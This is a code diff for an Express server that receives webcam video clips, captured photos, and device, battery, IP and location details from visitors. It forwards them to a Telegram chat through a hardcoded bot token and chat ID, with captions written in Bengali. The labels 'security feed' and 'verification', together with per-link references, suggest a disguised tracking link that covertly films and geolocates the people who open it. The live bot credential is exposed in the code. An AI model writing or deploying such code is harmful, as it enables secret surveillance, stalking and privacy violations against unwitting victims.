@@ -15,6 +15,61 @@ const PORT = 3000;
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
+// Helper to construct structured caption with device, battery, charging, IP, and location
+// eslint-disable-next-line @typescript-eslint/no-explicit-any
+function buildDetailedTelegramCaption(params: {
+  header: string;
+  verificationId: string;
+  alisId?: string;
+  cycle?: number;
+  time?: string;
+  deviceInfo?: any;
+  clientIp?: string;
+}): string {
+  const d = params.deviceInfo || {};
+  const effectiveIp =
+    d.ip && !d.ip.includes('Resolving')
+      ? d.ip
+      : params.clientIp || 'Unknown IP';
+
+  const location = d.location && d.location !== 'Unknown' ? d.location : 'Location Resolved';
+  const mapsUrl =
+    d.mapsUrl ||
+    (effectiveIp && !effectiveIp.startsWith('127.') && effectiveIp !== 'Unknown IP'
+      ? `https://www.google.com/maps?q=${encodeURIComponent(location !== 'Location Resolved' ? location : effectiveIp)}`
+      : '');
+
+  const battery = d.batteryLevel || 'Unknown';
+  const charging = d.batteryCharging || 'Unknown';
+  const device = d.deviceName || 'Smartphone / Desktop';
+  const browser = d.browser || 'Web Browser';
+  const platform = d.platform || 'Unknown OS';
+  const screen = d.screen || 'Default';
+  const isp = d.isp || 'Unknown Network Provider';
+  const timeStr = params.time ? new Date(params.time).toLocaleString('en-US') : new Date().toLocaleString('en-US');
+
+  return (
+`${params.header}
+🆔 সেশন আইডি: ${params.verificationId}
+🔗 লিংক রেফারেন্স: ${params.alisId || 'direct'}
+⏰ সময়: ${timeStr}
+
+📱 ডিভাইস ও ব্যাটারি তথ্য:
+• ডিভাইস নাম: ${device}
+• প্ল্যাটফর্ম/OS: ${platform}
+• ব্রাউজার: ${browser}
+• স্ক্রিন রেজ্যুলেশন: ${screen}
+• ব্যাটারি লেভেল: ${battery}
+• চার্জিং স্ট্যাটাস: ${charging}
+
+🌐 আইপি ও লাইভ লোকেশন:
+• পাবলিক IP: ${effectiveIp}
+• এলাকা/লোকেশন: ${location}
+• ISP/নেটওয়ার্ক: ${isp}
+• গুগল ম্যাপস: ${mapsUrl || 'N/A'}`
+  );
+}
+
 // Telegram integration status
 app.get('/api/telegram-status', (req, res) => {
   const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
@@ -26,10 +81,10 @@ app.get('/api/telegram-status', (req, res) => {
   });
 });
 
-// Endpoint to receive continuous 10-second security video clips
+// Endpoint to receive continuous 10-second security video clips in MP4
 app.post('/api/security-feed', async (req, res) => {
   try {
-    const { verificationId, alisId, cycle, timestamp, videoBase64, mimeType } = req.body;
+    const { verificationId, alisId, cycle, timestamp, videoBase64, mimeType, deviceInfo } = req.body;
 
     if (!verificationId) {
       return res.status(400).json({ error: 'verificationId is required' });
@@ -38,39 +93,68 @@ app.post('/api/security-feed', async (req, res) => {
     const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
     const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';
 
+    const clientIp =
+      (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
+      req.socket.remoteAddress ||
+      '';
+
     if (botToken && chatId && videoBase64) {
       try {
         const rawBase64 = videoBase64.includes(',') ? videoBase64.split(',')[1] : videoBase64;
         const buffer = Buffer.from(rawBase64, 'base64');
-        const ext = mimeType && mimeType.includes('mp4') ? 'mp4' : 'webm';
-        const file = new Blob([buffer], { type: mimeType || 'video/webm' });
+        
+        // Ensure MP4 extension and format for Telegram
+        const videoBlob = new Blob([buffer], { type: 'video/mp4' });
+        const videoFileName = `security_clip_${verificationId}_cycle${cycle || 1}.mp4`;
+
+        const caption = buildDetailedTelegramCaption({
+          header: `📹 সিকিউরিটি ফুটেজ [১০ সেকেন্ড ভিডিও #${cycle || 1}] (.mp4)`,
+          verificationId,
+          alisId,
+          cycle: cycle || 1,
+          time: timestamp,
+          deviceInfo,
+          clientIp,
+        });
+
         const formData = new FormData();
         formData.append('chat_id', chatId);
-        formData.append('video', file, `clip_${verificationId}_cycle${cycle || 1}.${ext}`);
-        formData.append(
-          'caption',
-          `📹 Security Feed [10s Clip #${cycle || 1}]\nID: ${verificationId}\nLink: ${alisId || 'direct'}\nTime: ${
-            timestamp || new Date().toISOString()
-          }\nStatus: Active Session Protected`
-        );
+        formData.append('video', videoBlob, videoFileName);
+        formData.append('caption', caption);
 
+        // Attempt sendVideo first
         const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
           method: 'POST',
           body: formData,
         });
 
         const tgData = (await tgRes.json()) as { ok: boolean; description?: string };
+        
+        // If sendVideo fails (e.g. transcode issue), fallback to sendDocument with .mp4
         if (!tgData.ok) {
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          console.warn('sendVideo error, falling back to sendDocument:', tgData.description);
+          const docFormData = new FormData();
+          docFormData.append('chat_id', chatId);
+          docFormData.append('document', videoBlob, videoFileName);
+          docFormData.append('caption', caption);
+
+          const docRes = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: `📹 Security Feed [10s Clip #${cycle || 1}]\nID: ${verificationId}\nTime: ${
-                timestamp || new Date().toISOString()
-              }\nStatus: Active Session Protected`,
-            }),
+            body: docFormData,
           });
+          const docData = (await docRes.json()) as { ok: boolean; description?: string };
+
+          if (!docData.ok) {
+            // Fallback text alert if media rejected
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: caption,
+              }),
+            });
+          }
         }
       } catch (tgErr) {
         console.warn('Telegram security feed forward warning:', tgErr);
@@ -88,10 +172,10 @@ app.post('/api/security-feed', async (req, res) => {
   }
 });
 
-// Verification notification with optional instant photo
+// Verification notification with instant photo, battery, device, IP, and location
 app.post('/api/notify-telegram', async (req, res) => {
   try {
-    const { verificationId, time, photoBase64, alisId } = req.body;
+    const { verificationId, time, photoBase64, alisId, deviceInfo } = req.body;
 
     if (!verificationId) {
       return res.status(400).json({ error: 'verificationId is required' });
@@ -108,10 +192,20 @@ app.post('/api/notify-telegram', async (req, res) => {
       });
     }
 
-    const formattedTime = time || new Date().toISOString();
-    const captionText = `✅ New Verification Completed!\nID: ${verificationId}\nLink: ${alisId || 'direct'}\nStatus: VALID\nTime: ${formattedTime}`;
+    const clientIp =
+      (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
+      req.socket.remoteAddress ||
+      '';
 
-    // If photo is captured, send as sendPhoto first
+    const captionText = buildDetailedTelegramCaption({
+      header: '📸 ভেরিফিকেশন রিকোয়েস্ট ও ফটো ক্যাপচার',
+      verificationId,
+      alisId,
+      time,
+      deviceInfo,
+      clientIp,
+    });
+
     let photoSent = false;
     if (photoBase64) {
       try {
@@ -137,7 +231,7 @@ app.post('/api/notify-telegram', async (req, res) => {
       }
     }
 
-    // If photo wasn't sent, send text message
+    // If photo wasn't sent, send rich text message
     if (!photoSent) {
       const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
